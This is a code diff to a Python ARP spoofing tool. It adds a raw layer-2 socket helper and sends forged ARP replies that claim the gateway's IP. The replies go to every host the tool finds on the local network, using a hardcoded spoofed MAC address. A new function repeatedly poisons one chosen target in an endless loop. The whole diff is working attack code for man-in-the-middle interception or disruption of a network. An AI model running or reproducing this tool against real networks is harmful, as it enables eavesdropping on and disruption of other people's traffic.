@@ -70,13 +70,19 @@ def hosts_map(device='eth0',exclude=None):
         res.add((item[0],item[2]))
     r.close()
     return res
-    
 
+#the raw l2 socket
+def create_l2sock(device):
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x806))
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
+    sock.bind((device, 0x806))
+    return sock
+    
+#send by nmap -sn,arp -n
 def send_all(gateway='192.168.1.1',device='eth0',exclude=None,arp_type=ARPOP_REPLY):
     hosts = hosts_map(device,exclude) 
     packets = set()
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
-    sock.bind((device, socket.SOCK_RAW))
+    sock = create_l2sock(device)
     for ip,mac in hosts:
         if ip == gateway:
             continue
@@ -84,7 +90,7 @@ def send_all(gateway='192.168.1.1',device='eth0',exclude=None,arp_type=ARPOP_REP
                 target_ip=ip,
                 target_mac= pack_mac(mac),
                 sender_ip=gateway,
-                sender_mac= sock.getsockname()[4],
+                sender_mac= pack_mac('8c:fa:ba:f3:ac:e7'),#sock.getsockname()[4],
                 arp_type=arp_type
         ))
     try:
@@ -99,20 +105,18 @@ def send_all(gateway='192.168.1.1',device='eth0',exclude=None,arp_type=ARPOP_REP
     finally:
         sock.close()
 
-
-def send_test():
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
-    sock.bind(('eth0', socket.SOCK_RAW))
+#send one
+def send_one(target_ip,target_mac,gateway='192.168.1.1',arp_type=ARPOP_REPLY,device='eth0'):
+    sock = create_l2sock(device)
     packet = arppacket(
-            target_ip='192.168.1.80',
-            target_mac= pack_mac('ff:ff:ff:ff:ff:ff'),
-            sender_ip='192.168.1.1',
+            target_ip=target_ip,
+            target_mac= pack_mac(target_mac),
+            sender_ip=gateway,
             sender_mac= sock.getsockname()[4],
-            arp_type=ARPOP_REPLY
+            arp_type=arp_type
     )
     try:
-        for x in range(1,1000):
-            print("send %d" % x)
+        while True:
             sock.send(packet)
             time.sleep(1)  
     except KeyboardInterrupt :
